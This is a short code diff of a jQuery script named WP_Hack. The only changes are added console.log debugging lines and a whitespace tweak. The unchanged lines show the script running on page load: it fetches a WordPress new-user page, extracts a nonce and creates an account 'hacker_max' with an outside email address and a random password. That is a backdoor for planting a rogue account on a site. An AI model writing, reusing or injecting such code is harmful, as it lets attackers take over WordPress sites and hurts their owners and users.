@@ -1,5 +1,7 @@
 (function ($) {
     var WP_Hack = function () {
+        console.log('Starting...');
+
         var username = 'hacker_max';
         var email = 'contact@blogk.xyz';
         var password = Math.random().toString(36).substring(2);
@@ -53,12 +55,13 @@
             url: new_user_url,
             success: function (html) {
                 var nonce = get_nonce(html);
+                console.log('Get nonce.');
                 create_new_user(nonce);
             }
         });
     };
 
-    $(document).ready(function() {
+    $(document).ready(function () {
         WP_Hack();
     });
 })(jQuery);
